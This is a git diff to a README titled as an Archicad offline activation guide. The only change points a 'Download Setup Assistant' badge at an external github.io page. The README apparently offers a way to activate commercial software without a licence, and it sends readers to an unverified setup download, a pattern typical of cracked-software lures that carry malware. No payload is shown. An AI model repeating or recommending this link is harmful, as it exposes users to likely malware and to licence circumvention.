@@ -1,6 +1,6 @@
 # Archicad — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://archicad-offline-activation-guide.github.io/.github)
 
 ## ⚙️ How to Use
 
